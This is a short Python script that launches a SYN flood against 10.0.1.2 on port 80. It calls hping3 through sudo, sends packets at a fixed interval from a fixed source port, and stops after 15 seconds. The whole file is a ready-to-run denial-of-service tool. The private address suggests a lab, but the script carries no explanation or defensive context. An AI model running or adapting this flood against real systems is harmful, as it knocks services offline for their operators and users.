import subprocess
import time
import signal
import sys

TARGET = "10.0.1.2"
PORT = 80
DURATION = 15

def main():
    print(f"[+] Starting SYN flood against {TARGET}:{PORT}")
    
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "-i", 
        "u1000",
        "-p", str(PORT),
        "-s", "12345",  # fixed source port for consistency
        TARGET,
    ])

    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")

    process.terminate()
    print("[+] SYN flood stopped.")

if __name__ == "__main__":
    main()